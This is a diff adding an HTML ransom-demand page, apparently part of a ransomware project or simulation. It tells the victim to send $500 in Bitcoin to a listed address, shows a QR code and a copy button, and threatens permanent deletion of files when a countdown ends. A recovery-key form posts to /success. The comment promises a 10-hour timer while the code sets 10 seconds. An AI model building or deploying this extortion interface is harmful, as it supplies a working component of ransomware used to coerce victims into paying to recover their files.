@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="stylesheet" href="/static/style.css">
+    <title>Payment Required</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>💰 Payment Required</h1>
+        <p>Send exactly <b>$500 in Bitcoin</b> to the address below:</p>
+
+        <p class="btc-address" id="btc-address">1BoatSLRHtKNngkdXEeobR76b53LETtpyT</p>
+
+        <button class="button small" onclick="copyToClipboard()">Copy Address</button>
+
+        <div id="qrcode" style="margin: 20px auto;"></div>
+
+        <p><strong>⏳ Time left before permanent file loss:</strong></p>
+        <p id="timer" style="font-size: 1.5rem; color: red;"></p>
+
+        <form action="/success" method="post" style="margin-top: 30px;">
+            <input type="text" name="key" placeholder="Enter Recovery Key" required />
+            <button type="submit" class="button">I've Paid</button>
+        </form>
+
+        <p style="margin-top: 40px; color: gray;">⚠️ If the timer expires and no payment is received, your files will be permanently deleted.</p>
+    </div>
+
+    <script>
+        // Countdown timer (10 hours)
+        var seconds = 10;
+        function updateTimer() {
+            var h = Math.floor(seconds / 3600);
+            var m = Math.floor((seconds % 3600) / 60);
+            var s = seconds % 60;
+            document.getElementById('timer').innerText = `${h}h ${m}m ${s}s`;
+            seconds--;
+            if (seconds >= 0) setTimeout(updateTimer, 1000);
+            else {
+                // Redirect to expired endpoint
+                window.location.href = "/expired";
+            }
+        }
+        updateTimer();
+
+        // Copy BTC address
+        function copyToClipboard() {
+            const btcAddress = document.getElementById("btc-address").innerText;
+            navigator.clipboard.writeText(btcAddress).then(() => {
+                alert("Bitcoin address copied to clipboard.");
+            });
+        }
+
+        // Generate QR code
+        var qr = new QRious({
+            element: document.getElementById('qrcode'),
+            value: document.getElementById('btc-address').innerText,
+            size: 180
+        });
+    </script>
+</body>
+</html>
